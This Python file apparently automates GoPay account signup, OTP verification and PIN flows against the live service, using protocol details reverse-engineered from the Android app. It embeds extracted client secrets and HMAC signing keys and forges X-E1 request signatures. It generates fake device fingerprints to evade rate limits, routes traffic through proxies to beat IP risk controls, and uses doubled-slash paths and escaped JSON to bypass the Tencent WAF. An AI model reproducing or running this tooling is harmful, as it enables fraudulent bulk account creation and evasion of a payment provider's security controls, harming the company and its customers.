#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import pathlib
import re
import secrets
import subprocess
import time
import uuid
from dataclasses import dataclass
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import urlparse

import httpx

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except Exception:  # pragma: no cover - dependency is present on the current box.
    Cipher = algorithms = modes = default_backend = None

AUTH = "https://accounts.goto-products.com"
API = "https://api.gojekapi.com"
CUSTOMER = "https://customer.gopayapi.com"

APP_ID = "com.gojek.gopay"
APP_VERSION = "2.10.0"
APP_BUILD = "2100"
AUTH_ID = "gopay:consumer:app"
AUTH_SECRET = "raOUumeMRBNifqvZRFjvsgTnjAlaA9"
# known-PIN 登录（goto_pin / login_1fa）用的 PIN 客户端标识，来自
# 20260602/gopay_rebind_smscode.py::login_with_known_pin。这个 client_id 跟
# 付款链路里的 MGUPA / GWC 不是一回事——它专门用于 login_1fa 的 PIN 验证。
MFAGOJEK_CLIENT_ID = "6d11d261d7ae462dbd4be0dc5f36a697-MFAGOJEK"
SIGNUP_CLIENT_NAME = "gopay_consumer_app"
# Signup body still uses the LoginSDK client secret in the closest live/OSINT
# implementation; the endpoint-level Authorization is a separate static Basic
# suffix, not base64(client:secret).
SIGNUP_CLIENT_SECRET = AUTH_SECRET
SIGNUP_BASIC_UUID = "bb648413-b637-443a-8ebf-176cf9b5dc32"
SIGNUP_BASIC_SUFFIX = base64.b64encode(SIGNUP_BASIC_UUID.encode("utf-8")).decode("ascii")
SIGNUP_XOR_SECRET_CANDIDATE = "09f5686f234a8cf023cef42089ba483ba8c66fc64d9a4b778f7ecf9f0976010e"
AUTHSDK_VERSION = "1.0.0"
CVSDK_VERSION = "1.0.0"
X_E2_DEFAULT = "ED9A2B38749FBDE9ACA61D6A685B7"
DISPLAY_ENCODER_SUPPORT_CODE_KEY = "F7qonjstEjipAjlZ9O1E16S5Oo2PEHLe"
# Runtime-recovered from the in-app enhanced DisplayEncoder path
# libbatteryOpt.so+0x733dc -> +0x76150 (HMAC-SHA256).
DISPLAY_ENCODER_ENHANCED_KEY = "4&G6DbV&j8QZs~{)(Ila_w_|v@aqJq]E-;*(J9PanZ8sm01kTi{X<iG``]d7P&L"
# Runtime-observed enhanced key for one logged-in paylater request. It proves
# where the enhanced key enters getAppCodec, but is request/session dependent
# and is therefore not used as the default for fresh signup.
DISPLAY_ENCODER_ENHANCED_KEY_OBSERVED = "1V79g&FZMB#zQ9:[T+8*xr1FXYVJ#%J)LiKl?c?=JG8dc{cX?d?p-u&Ti)$<vJC"


def minjson(obj: Any) -> str:
    return json.dumps(obj, ensure_ascii=False, separators=(",", ":"))


def new_device_id() -> str:
    # App-side X-UniqueId observed as 16 lower-case hex (Android per-package SSAID).
    return secrets.token_hex(8)


def new_d1() -> str:
    return ":".join(f"{b:02X}" for b in os.urandom(32))


def normalize_id_phone(phone: str) -> Tuple[str, str]:
    digits = re.sub(r"\D", "", phone)
    if digits.startswith("62"):
        return "+62", digits[2:]
    if digits.startswith("0"):
        return "+62", digits[1:]
    return "+62", digits


def extract_path(base: str, path: str) -> Tuple[str, str]:
    u = urlparse(base)
    return u.netloc, path


def pick_first(obj: Any, names: Iterable[str]) -> Optional[Any]:
    if isinstance(obj, dict):
        for n in names:
            if n in obj and obj[n] not in (None, ""):
                return obj[n]
        for v in obj.values():
            got = pick_first(v, names)
            if got not in (None, ""):
                return got
    elif isinstance(obj, list):
        for v in obj:
            got = pick_first(v, names)
            if got not in (None, ""):
                return got
    return None


def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    n = block_size - (len(data) % block_size)
    return data + bytes([n]) * n


def tokenize_pin_aes_ecb(pin: str, pin_token: str) -> str:
    """Current pure-Python candidate for Dart `tokenizePin`.

    Static Android evidence:
    `getNavigationItemCount.smali` exposes MethodChannel `help_center_sdk`
    method `encrypt(textToEncrypt, encryptionKey)`, backed by
    `com.gojek.gopay.CipherUtil.encrypt`. It repeats the key until it has at
    least 16 chars, takes the first 16 chars, then uses Java
    `Cipher.getInstance("AES")`; on Android this is AES/ECB/PKCS5Padding.

    The GoPay Dart AOT strings place `tokenizePin`, `pin_token`, and
    `encryptionKey` in the same PIN flow area, so this is wired as the default
    tokenizer while X-E1 is being finished. If runtime later disproves it,
    callers can still override with `--tokenized-pin` or
    `--pin-tokenizer-cmd`.
    """
    if not pin or not re.fullmatch(r"\d{4,8}", pin):
        raise ValueError("PIN must be 4-8 digits")
    if not pin_token:
        raise ValueError("empty pin_token")
    if Cipher is None:
        raise RuntimeError("cryptography package is required for AES PIN tokenization")
    key = (pin_token * ((16 + len(pin_token) - 1) // len(pin_token)))[:16].encode("utf-8")
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    enc = cipher.encryptor()
    out = enc.update(pkcs7_pad(pin.encode("utf-8"), 16)) + enc.finalize()
    return base64.b64encode(out).decode("ascii")


@dataclass
class DeviceProfile:
    unique_id: str
    x_m1: str
    d1: str = ""
    x_e2: str = X_E2_DEFAULT
    x_session_id: str = ""
    adjts: str = "host:D"
    phone_make: str = "Xiaomi"
    phone_model: str = "Xiaomi, 23117RK66C"
    device_os: str = "Android, 15"
    app_id: str = APP_ID
    app_version: str = APP_VERSION
    app_build: str = APP_BUILD

    def __post_init__(self) -> None:
        if not self.d1:
            self.d1 = new_d1()
        if not self.x_session_id:
            self.x_session_id = str(uuid.uuid4())

    @classmethod
    def default(cls, unique_id: Optional[str] = None, x_m1: Optional[str] = None) -> "DeviceProfile":
        # Runtime X-M1 is part of the device-rate-limit surface. Generate a
        # fresh tuple in the same shape as the mobile wrapper.
        uid = unique_id or new_device_id()
        # Keep the shape close to the runtime captures.  A more "rich" M1
        # tuple with location providers/wifi MACs reached CVS but triggered
        # init_verification rate limits more often in live runs; the captured
        # app tuple used wifi-off placeholders and a stable-looking Widevine
        # marker, so randomise only the per-device parts.
        widevine = "RkFLRV9XVk5f" + time.strftime("%Y%m%d") + "_" + secrets.token_hex(2).upper()
        fp15 = secrets.token_hex(16)
        dev_uuid = str(uuid.uuid4())
        make = "Xiaomi"
        model = "Xiaomi, 23117RK66C"
        chipset = "pineapple"
        return cls(
            unique_id=uid,
            d1=new_d1(),
            x_m1=x_m1
            or (
                f"3:{int(time.time()*1000)}-{secrets.randbelow(10**19)},"
                f"4:{secrets.randbelow(900000)+100000},"
                f"5:{chipset}|2265|8,"
                "6:<wifi is turned off>,"
                "7:<wifi is turned off>,"
                "8:1080x2400,"
                "10:0,"
                f"11:{widevine},"
                f"15:{fp15},"
                f"16:{dev_uuid}"
            ),
            phone_make=make,
            phone_model=model,
        )

    @classmethod
    def from_capture(cls, artifact_path: str | os.PathLike[str], index: int = 0) -> "DeviceProfile":
        data = json.loads(pathlib.Path(artifact_path).read_text(encoding="utf-8"))
        row = data[index] if isinstance(data, list) else (data.get("items") or data.get("artifacts"))[index]
        return cls(
            unique_id=row["x_uniqueid"],
            x_m1=row["x_m1"],
            d1=row.get("d1") or row.get("D1") or new_d1(),
            x_e2=row.get("x_e2") or X_E2_DEFAULT,
            x_session_id=row.get("x_session_id") or row.get("X-Session-ID") or "",
            adjts=row.get("adjts") or row.get("AdjTs") or "host:D",
            phone_model=row.get("phone_model") or "Xiaomi, 23117RK66C",
            phone_make=(row.get("phone_model") or "Xiaomi").split(",")[0],
            device_os=row.get("device_os") or "Android, 15",
            app_id=row.get("app_id") or APP_ID,
            app_version=row.get("app_version") or APP_VERSION,
        )


class XESigner:
    name = "none"

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        raise NotImplementedError


class NullSigner(XESigner):
    name = "none"

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        return ""


class CapturedSigner(XESigner):
    """Replay-only signer.

    It returns an already captured X-E1 only when method/host/path/body and
    X-UniqueId match byte-for-byte. It is useful for regression and for proving
    the HTTP layer, but cannot sign a new phone/body.
    """

    name = "captured"

    def __init__(self, artifact_path: str | os.PathLike[str]):
        data = json.loads(pathlib.Path(artifact_path).read_text(encoding="utf-8"))
        rows = data if isinstance(data, list) else (data.get("items") or data.get("artifacts") or [])
        self.rows = rows

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        hp = host + path
        uid = headers.get("x-uniqueid") or headers.get("X-UniqueId")
        for row in self.rows:
            if (
                row.get("method", "").upper() == method.upper()
                and row.get("host_path") == hp
                and row.get("body_text") == body_text
                and row.get("x_uniqueid") == uid
            ):
                return row["x_e1"]
        raise RuntimeError(f"no captured X-E1 for {method} {hp} uid={uid} body={body_text[:160]}")


class AdbOracleSigner(XESigner):
    """Call the current /data/local/tmp app_process oracle.

    This does not drive the GoPay UI. Current local evidence shows this oracle
    produces a syntactically valid fallback X-E1, but server rejects it with
    GoPay-1000 for fresh bodies unless the enhanced DisplayEncoder state is
    solved. The runner keeps this mode because it is the clean swappable seam.
    """

    name = "adb-oracle"

    def __init__(
        self,
        adb: str = "./adb/adb",
        oracle_dex: str = "/data/local/tmp/oracle.dex",
        libbattery: str = "/data/local/tmp/libbatteryOpt.so",
        liboracle: str = "/data/local/tmp/liboracle.so",
        timeout: int = 25,
    ):
        self.adb = adb
        self.oracle_dex = oracle_dex
        self.libbattery = libbattery
        self.liboracle = liboracle
        self.timeout = timeout

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        ts_s = str(ts or int(time.time() * 1000))
        support = [
            headers.get("authorization", ""),
            ts_s,
            host + path,
            method.upper(),
            body_text or "",
            headers.get("d1", ""),
            headers.get("x-phonemodel", ""),
            headers.get("x-m1", ""),
            headers.get("x-deviceos", ""),
            headers.get("x-appid", ""),
            headers.get("x-appversion", ""),
            "D",
            headers.get("x-uniqueid", ""),
        ]
        raw = "\x1f".join(support)
        b64 = base64.b64encode(raw.encode()).decode()
        cmd = (
            f"CLASSPATH={self.oracle_dex} app_process64 /system/bin OracleMain "
            f"{self.libbattery} {self.liboracle} --b64 {b64}"
        )
        p = subprocess.run([self.adb, "shell", cmd], text=True, capture_output=True, timeout=self.timeout)
        if p.returncode != 0:
            raise RuntimeError(f"oracle failed rc={p.returncode}\nSTDOUT={p.stdout}\nSTDERR={p.stderr}")
        first = p.stdout.strip().splitlines()[0]
        try:
            obj = json.loads(first)
            return obj["ext"]
        except Exception:
            return first.strip()


class PurePythonXESigner(XESigner):
    """Pure Python implementation of libbatteryOpt.so getAppCodec fallback.

    Static/runtime proof points:
    - libbatteryOpt.so+0x82774 is HMAC-SHA256(key, data) with 32-byte output.
    - libbatteryOpt.so+0x815e8 is MD5-to-lower-hex.
    - libbatteryOpt.so+0x6e944 assembles X-E1 as
      hmac_hex + ':' + 80-byte-random-hex + ':' + supportEducation + ':' + ts.
    - Direct app_process oracle call to 0x6e944 with key
      DISPLAY_ENCODER_SUPPORT_CODE_KEY matched this exact HMAC message order.

    The real in-app enhanced DisplayEncoder path can substitute a different
    resolution key. Keep `resolution_key` configurable so the protocol runner
    remains adb-free once that key is supplied/recovered.
    """

    name = "pure"

    def __init__(self, resolution_key: str = DISPLAY_ENCODER_SUPPORT_CODE_KEY, random_hex: Optional[str] = None):
        if not resolution_key:
            raise ValueError("empty X-E1 resolution key")
        self.resolution_key = resolution_key
        self.random_hex = random_hex

    @staticmethod
    def body_md5(body_text: str) -> str:
        return hashlib.md5((body_text or "").encode("utf-8")).hexdigest()

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        ts_s = str(ts or int(time.time() * 1000))
        auth = headers.get("authorization", "") or ""
        if auth.startswith("Bearer "):
            # Native strips the literal prefix before using supportPulsa.
            auth = auth[len("Bearer ") :]
        rand_hex = self.random_hex or secrets.token_hex(80)
        if not re.fullmatch(r"[0-9a-fA-F]{160}", rand_hex):
            raise ValueError("X-E1 random hex must be exactly 160 hex chars")
        rand_hex = rand_hex.lower()
        support = {
            "supportPulsa": auth,
            "supportDataPackage": ts_s,
            "supportPlnToken": host + path,
            "supportEMoney": method.upper(),
            "supportPln": body_text or "",
            "supportPdam": headers.get("d1", "") or "",
            "supportBpjs": headers.get("x-phonemodel", ""),
            "supportInternetCable": headers.get("x-m1", ""),
            "supportPhonePostPaid": headers.get("x-deviceos", ""),
            "supportMultifinance": headers.get("x-appid", ""),
            "supportEInvoicing": headers.get("x-appversion", ""),
            "supportEducation": "D",
            "supportInsurance": headers.get("x-uniqueid", ""),
        }
        # Exact concatenation order from libbatteryOpt.so+0x6eb8c..0x6f1bc.
        msg = ":".join(
            [
                support["supportPulsa"],
                support["supportBpjs"],
                support["supportInternetCable"],
                support["supportEInvoicing"],
                self.body_md5(support["supportPln"]),
                support["supportInsurance"],
                support["supportEMoney"],
                support["supportPhonePostPaid"],
                support["supportDataPackage"],
                support["supportPdam"],
                support["supportPlnToken"],
                support["supportMultifinance"],
                rand_hex,
            ]
        )
        sig = hmac.new(self.resolution_key.encode("utf-8"), msg.encode("utf-8"), hashlib.sha256).hexdigest()
        return f"{sig}:{rand_hex}:D:{ts_s}"


class EnhancedPythonXESigner(XESigner):
    """Pure Python implementation of the in-app enhanced X-E1 path.

    Runtime proof:
    `runtime_now/trace_xe1_core_20260530_012608.stdout` captured
    libbatteryOpt.so+0x733dc immediately before +0x76150:

    - key: ``DISPLAY_ENCODER_ENHANCED_KEY``
    - message:
      ``GOPAY;{model}:{auth};{uid}:{d1};{md5(body)}:{host_path};...``
    - final:
      ``hmac_sha256_hex(message):random_80_bytes_hex:D:timestamp``

    This is the signer used by the live app for
    ``/v1/support/customer/initiate`` and the same field construction is used
    for the rest of the protocol calls.
    """

    name = "enhanced"

    def __init__(self, resolution_key: str = DISPLAY_ENCODER_ENHANCED_KEY, random_hex: Optional[str] = None):
        if not resolution_key:
            raise ValueError("empty enhanced X-E1 key")
        self.resolution_key = resolution_key
        self.random_hex = random_hex

    @staticmethod
    def body_md5(body_text: str) -> str:
        return hashlib.md5((body_text or "").encode("utf-8")).hexdigest()

    @staticmethod
    def _auth_value(headers: Dict[str, str]) -> str:
        auth = headers.get("authorization", "") or headers.get("Authorization", "") or ""
        if auth.startswith("Bearer "):
            auth = auth[len("Bearer ") :]
        return auth

    @staticmethod
    def _phone_make(headers: Dict[str, str]) -> str:
        make = headers.get("x-phonemake", "") or headers.get("X-PhoneMake", "") or ""
        if make:
            return make
        model = headers.get("x-phonemodel", "") or headers.get("X-PhoneModel", "") or ""
        return model.split(",", 1)[0].strip() if model else ""

    @staticmethod
    def _os_family(headers: Dict[str, str]) -> str:
        os_name = headers.get("x-deviceos", "") or headers.get("X-DeviceOs", "") or ""
        return os_name.split(",", 1)[0].strip() if os_name else ""

    def build_message(
        self,
        method: str,
        host: str,
        path: str,
        body_text: str,
        headers: Dict[str, str],
        ts_s: str,
        rand_hex: str,
    ) -> str:
        fields = [
            "GOPAY",
            headers.get("x-phonemodel", "") or headers.get("X-PhoneModel", ""),
            self._auth_value(headers),
            headers.get("x-uniqueid", "") or headers.get("X-UniqueId", ""),
            headers.get("d1", "") or headers.get("D1", ""),
            self.body_md5(body_text),
            host + path,
            method.upper(),
            ts_s,
            headers.get("x-deviceos", "") or headers.get("X-DeviceOs", ""),
            headers.get("x-appversion", "") or headers.get("X-AppVersion", ""),
            headers.get("x-m1", "") or headers.get("X-M1", ""),
            headers.get("x-appid", "") or headers.get("X-AppId", ""),
            rand_hex,
            self._phone_make(headers),
            self._os_family(headers),
        ]
        out = []
        for i, value in enumerate(fields):
            out.append(value or "")
            if i != len(fields) - 1:
                out.append(";" if i % 2 == 0 else ":")
        return "".join(out)

    def sign(self, method: str, host: str, path: str, body_text: str, headers: Dict[str, str], ts: Optional[int] = None) -> str:
        ts_s = str(ts or int(time.time() * 1000))
        rand_hex = self.random_hex or secrets.token_hex(80)
        if not re.fullmatch(r"[0-9a-fA-F]{160}", rand_hex):
            raise ValueError("enhanced X-E1 random hex must be exactly 160 hex chars")
        rand_hex = rand_hex.lower()
        msg = self.build_message(method, host, path, body_text or "", headers, ts_s, rand_hex)
        sig = hmac.new(self.resolution_key.encode("utf-8"), msg.encode("utf-8"), hashlib.sha256).hexdigest()
        return f"{sig}:{rand_hex}:D:{ts_s}"


class GoPayProtocol:
    def __init__(
        self,
        device: DeviceProfile,
        signer: Optional[XESigner] = None,
        client_id: str = AUTH_ID,
        client_secret: str = AUTH_SECRET,
        debug: bool = True,
        dry_run: bool = False,
        proxy: str = "",
    ):
        self.device = device
        self.signer = signer or NullSigner()
        self.client_id = client_id
        self.client_secret = client_secret
        self.debug = debug
        self.dry_run = dry_run
        self.proxy = str(proxy or "").strip()
        # 代理（HTTP/HTTPS）用于绕过腾讯 WAF 的 IP 风控；注册必须走印尼住宅/
        # 机房 IP。socks 代理需要额外的 socksio 依赖，这里只支持 http(s)，由
        # 上层 ``_normalize_proxy_url`` 统一补 ``http://`` 前缀。
        client_kwargs: Dict[str, Any] = dict(
            timeout=35, http2=True, follow_redirects=False, trust_env=False
        )
        if self.proxy:
            client_kwargs["proxy"] = self.proxy
        self.c = httpx.Client(**client_kwargs)
        # 会话级 transaction-id：GoPay 服务端把一组 CVS 调用（methods ->
        # initiate -> verify/retry）当作同一会话，用 transaction-id 串起来。
        # 每个请求都换新 transaction-id 会被判 invalid_parameter（实测
        # 2026-06）。设置后 ``headers()`` 复用它；置空则每次随机（默认行为）。
        self.session_txn: str = ""

    def new_cvs_session(self) -> str:
        """开一个新的 CVS 会话 transaction-id，之后的请求都复用它。

        在调用 ``cvs_methods`` 之前调一次；同一手机号的 methods/initiate/
        verify/retry 必须共用这一个 transaction-id。PIN 阶段（独立 CVS 流程）
        再开一个新的。
        """
        self.session_txn = str(uuid.uuid4())
        return self.session_txn

    def clear_cvs_session(self) -> None:
        self.session_txn = ""

    def close(self) -> None:
        self.c.close()

    def headers(self, auth: Optional[str] = None, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        h: Dict[str, str] = {
            "accept": "application/json",
            "accept-language": "id-ID",
            "accept-encoding": "gzip",
            "authorization": f"Bearer {auth}" if auth else "",
            "content-type": "application/json",
            "country-code": "ID",
            "gojek-country-code": "ID",
            "gojek-service-area": "1",
            "gojek-timezone": "Asia/Jakarta",
            "d1": self.device.d1,
            "transaction-id": self.session_txn or str(uuid.uuid4()),
            "user-agent": f"GoPay/{self.device.app_version} ({self.device.app_id}; build:{self.device.app_build}; Android, 15)",
            "x-appid": self.device.app_id,
            "x-apptype": "GOPAY",
            "x-appversion": self.device.app_version,
            "x-authsdk-version": AUTHSDK_VERSION,
            "x-deviceos": self.device.device_os,
            "x-devicetoken": "",
            "x-e2": self.device.x_e2,
            "x-help-version": self.device.app_version,
            "x-m1": self.device.x_m1,
            "x-phonemake": self.device.phone_make,
            "x-phonemodel": self.device.phone_model,
            "x-platform": "Android",
            "x-request-id": str(uuid.uuid4()),
            "x-uniqueid": self.device.unique_id,
            "x-user-locale": "id_ID",
            "x-user-type": "customer",
        }
        if extra:
            h.update({k.lower(): v for k, v in extra.items()})
        return h

    def _send(self, method: str, base: str, path: str, body: Optional[Dict[str, Any]], auth: Optional[str] = None, extra_headers: Optional[Dict[str, str]] = None, sign_ts: Optional[int] = None, sign_path: Optional[str] = None, body_text_override: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        host, pth = extract_path(base, sign_path or path)
        body_text = body_text_override if body_text_override is not None else ("" if body is None else minjson(body))
        h = self.headers(auth=auth, extra=extra_headers)
        # The accounts stack in the Android wrapper sends these on all
        # goto-auth/CVS requests, not only `/cvs/*`.  `/goto-auth/token` is
        # particularly sensitive to the same low-level fingerprint header set.
        if base == AUTH:
            h["x-cvsdk-version"] = CVSDK_VERSION
        h.setdefault("x-e3", hashlib.md5(body_text.encode("utf-8")).hexdigest())
        h.setdefault("x-session-id", self.device.x_session_id)
        h.setdefault("adjts", self.device.adjts or "host:D")
        xe1 = self.signer.sign(method, host, pth, body_text, h, ts=sign_ts)
        if xe1:
            h["x-e1"] = xe1
        if self.debug:
            print(f"\n>>> {method.upper()} {base}{path}")
            if sign_path and sign_path != path:
                print(f">>> sign-path {host}{sign_path}")
            print(">>> signer", self.signer.name)
            print(">>> headers", json.dumps({k: h[k] for k in sorted(h) if k in {
                "authorization", "transaction-id", "x-request-id", "x-uniqueid", "x-m1", "x-e1", "x-e2",
                "x-e3", "x-session-id", "adjts", "x-cvsdk-version", "x-appversion", "x-authsdk-version", "x-phonemodel", "x-deviceos",
            }}, ensure_ascii=False, indent=2))
            print(">>> body", body_text)
        if self.dry_run:
            return 0, {"dry_run": True, "url": base + path, "headers": h, "body": body_text}, {}
        r = self.c.request(method, base + path, headers=h, content=body_text.encode() if body_text else b"")
        if self.debug:
            print("<<<", r.status_code, r.headers.get("content-type"))
            print(r.text[:5000])
        try:
            data = r.json()
        except Exception:
            data = {"raw": r.text}
        return r.status_code, data, dict(r.headers)

    def post(self, base: str, path: str, body: Dict[str, Any], auth: Optional[str] = None, extra_headers: Optional[Dict[str, str]] = None, sign_path: Optional[str] = None, body_text_override: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        return self._send("POST", base, path, body, auth=auth, extra_headers=extra_headers, sign_path=sign_path, body_text_override=body_text_override)

    def get(self, base: str, path: str, auth: Optional[str] = None, extra_headers: Optional[Dict[str, str]] = None, sign_path: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        return self._send("GET", base, path, None, auth=auth, extra_headers=extra_headers, sign_path=sign_path)

    def login_methods(self, phone_local: str, country_code: str = "+62") -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "phone_number": phone_local,
            "country_code": country_code,
            "email": "",
            "device_verification_token_id": "",
            "client_id": self.client_id,
            "client_secret": self.client_secret,
        }
        return self.post(AUTH, "/goto-auth/login/methods", body)

    def cvs_methods(self, phone_local: str, flow: str = "signup", country_code: str = "+62", device_verification_token_id: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "country_code": country_code,
            "email_address": None,
            "client_id": self.client_id,
            "phone_number": phone_local,
            "client_secret": self.client_secret,
            "flow": flow,
            "device_verification_token_id": device_verification_token_id,
        }
        return self.post(AUTH, "/cvs/v1/methods", body)

    def cvs_initiate(self, phone_local: str, verification_id: str, method: str = "otp_sms", flow: str = "signup", country_code: str = "+62", device_verification_token_id: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "verification_id": verification_id,
            "flow": flow,
            "verification_method": method,
            "country_code": country_code,
            "email_address": None,
            "client_id": self.client_id,
            "phone_number": phone_local,
            "client_secret": self.client_secret,
            "is_multiple_method": None,
            "device_verification_token_id": device_verification_token_id,
        }
        # Current edge behavior blocks the literal path at Tencent WAF before
        # the request reaches CVS, while the backend normalizes a doubled slash.
        # Sign the canonical path (what the app signs / what CVS validates) but
        # send `/cvs/v1//initiate` through the edge.  With an invalid
        # verification_id this reaches the business layer as
        # `scp-cvs:error:validation:verification_id_invalid`, proving the
        # bypass without relying on adb/Frida/App runtime.
        return self.post(AUTH, "/cvs/v1//initiate", body, extra_headers={"key": "value"}, sign_path="/cvs/v1/initiate")

    def cvs_retry(self, otp_token: str, method: str = "otp_sms", flow: str = "signup") -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT exact body at libapp.so+0x1246e14 with nested data
        # toJson at libapp.so+0x1246ed8:
        #   {client_id, client_secret, flow, verification_method,
        #    data: {otp_token}}
        body = {
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "flow": flow,
            "verification_method": method,
            "data": {"otp_token": otp_token},
        }
        return self.post(AUTH, "/cvs/v1/retry", body)

    def cvs_verify(self, phone_local: str, verification_id: str, otp: str, method: str = "otp_sms", flow: str = "signup", country_code: str = "+62", device_verification_token_id: Optional[str] = None, otp_token: Optional[str] = None) -> Tuple[int, Any, Dict[str, str]]:
        # Recovered from Flutter AOT (libapp.so):
        #   map keys = client_id, client_secret, flow, verification_method,
        #              verification_id, data
        # For OTP methods `data` is a nested map: {"otp": code,
        # "otp_token": token_from_initiate}. Top-level otp/code fields make
        # the server answer scp-cvs:error:missing_field; a plain-string data
        # value returns scp-cvs:error:malformed_request.
        body = {
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "flow": flow,
            "verification_method": method,
            "verification_id": verification_id,
            "data": {"otp": otp, "otp_token": otp_token or ""},
        }
        return self.post(AUTH, "/cvs/v1/verify", body)

    def customer_signup(
        self,
        phone_local: str,
        full_name: str,
        country_code: str = "+62",
        verification_token: Optional[str] = None,
        signup_client_name: str = SIGNUP_CLIENT_NAME,
        signup_client_secret: str = SIGNUP_CLIENT_SECRET,
        signup_basic: Optional[str] = None,
        signed_up_country: str = "62",
        email: str = "",
        escape_client_name_colon: bool = False,
    ) -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT exact shape:
        #   wrapper:     libapp.so+0x24c3604
        #   body toJson: libapp.so+0x159f034
        #   data toJson: libapp.so+0x159f0c8
        #   headers: Verification-Token: Bearer <token>,
        #            Authorization: Basic <eZh._lzs auth suffix>
        #
        # Important: the old implementation incorrectly sent
        # phone_number/country_code/full_name/client_id at the top level.  The
        # app sends only {client_name, client_secret, data:{...}}.
        phone_full = re.sub(r"\D", "", phone_local)
        if country_code == "+62" and not phone_full.startswith("62"):
            phone_full = "62" + phone_full
        body = {
            "client_name": signup_client_name,
            "client_secret": signup_client_secret,
            "data": {
                "name": full_name,
                "phone": phone_full,
                "email": email,
                "signed_up_country": signed_up_country,
                "onboarding_partner": SIGNUP_CLIENT_NAME,
            },
        }
        if signup_basic is None:
            # AOT concatenates "Basic " with an injected suffix.  OSINT for
            # the same endpoint recovered this as base64(UUID), not
            # base64(client_name:client_secret).
            signup_basic = SIGNUP_BASIC_SUFFIX
        extra: Dict[str, str] = {"authorization": f"Basic {signup_basic}"}
        if verification_token:
            extra["verification-token"] = f"Bearer {verification_token}"
        # Runtime path routing shows api.gojekapi.com reaches the business
        # layer; customer.gopayapi.com returns Kong/ESA 404 for this path.
        #
        # Edge/WAF behavior differs from the app's canonical request path:
        # literal `/v7/customers/signup` is commonly stopped by Tencent WAF,
        # while the backend normalizes a doubled slash and reaches the customer
        # service.  Keep the X-E1 canonical path equal to the AOT literal, but
        # send `/v7//customers/signup` through the edge, mirroring the proven
        # `/cvs/v1//initiate` bypass pattern.
        body_text_override = None
        if escape_client_name_colon and ":" in signup_client_name:
            # Tencent WAF false-positives on the literal colon-bearing client
            # name, while JSON unicode escapes are decoded to the same string
            # by the backend. Sign exactly what is sent on the wire.
            body_text_override = minjson(body).replace("gopay:consumer:app", "gopay\\u003aconsumer\\u003aapp")
        return self.post(
            API,
            "/v7//customers/signup",
            body,
            extra_headers=extra,
            sign_path="/v7/customers/signup",
            body_text_override=body_text_override,
        )

    def pin_allowed(self, access_token: str, pin: str) -> Tuple[int, Any, Dict[str, str]]:
        return self.post(CUSTOMER, "/api/v1/users/pins/allowed", {"pin": pin}, auth=access_token)

    def user_profile(self, access_token: str) -> Tuple[int, Any, Dict[str, str]]:
        return self.get(CUSTOMER, "/v1/users/profile", auth=access_token)

    def cvs_methods_pin(self, access_token: str) -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "country_code": None,
            "email_address": None,
            "client_id": self.client_id,
            "phone_number": None,
            "client_secret": self.client_secret,
            "flow": "goto_pin_wa_sms",
            "device_verification_token_id": None,
        }
        return self.post(AUTH, "/cvs/v1/methods", body, auth=access_token)

    def cvs_initiate_pin(self, access_token: str, verification_id: str, method: str = "otp_sms") -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "verification_id": verification_id,
            "flow": "goto_pin_wa_sms",
            "verification_method": method,
            "country_code": None,
            "email_address": None,
            "client_id": self.client_id,
            "phone_number": None,
            "client_secret": self.client_secret,
            "is_multiple_method": None,
            "device_verification_token_id": None,
        }
        return self.post(AUTH, "/cvs/v1//initiate", body, auth=access_token, extra_headers={"key": "value"}, sign_path="/cvs/v1/initiate")

    def cvs_retry_pin(self, access_token: str, otp_token: str, method: str = "otp_sms") -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "flow": "goto_pin_wa_sms",
            "verification_method": method,
            "data": {"otp_token": otp_token},
        }
        return self.post(AUTH, "/cvs/v1/retry", body, auth=access_token)

    def cvs_verify_pin(self, access_token: str, verification_id: str, otp: str, otp_token: str, method: str = "otp_sms") -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "flow": "goto_pin_wa_sms",
            "verification_method": method,
            "verification_id": verification_id,
            "data": {"otp": otp, "otp_token": otp_token},
        }
        return self.post(AUTH, "/cvs/v1/verify", body, auth=access_token)

    def accountlist(self, verification_token: str) -> Tuple[int, Any, Dict[str, str]]:
        # Flutter AOT request wrapper at libapp.so+0x241a274:
        #   POST /goto-auth/accountlist
        #   headers: Transaction-ID, Verification-Token
        #   body toJson at libapp.so+0x12697e4: {client_id, client_secret}
        # A stale token returns HTTP 401 {"message":"Invalid/Expired token"},
        # confirming this is the post-CVS step that resolves numeric account_id
        # before /goto-auth/token.
        body = {"client_id": self.client_id, "client_secret": self.client_secret}
        return self.post(AUTH, "/goto-auth/accountlist", body, extra_headers={"Verification-Token": f"Bearer {verification_token}"})

    def device_verification_login(self, phone_local: str, verification_id: str, otp: str, country_code: str = "+62", method: str = "otp_sms") -> Tuple[int, Any, Dict[str, str]]:
        body = {
            "phone_number": phone_local,
            "country_code": country_code,
            "verification_id": verification_id,
            "challenge_id": verification_id,
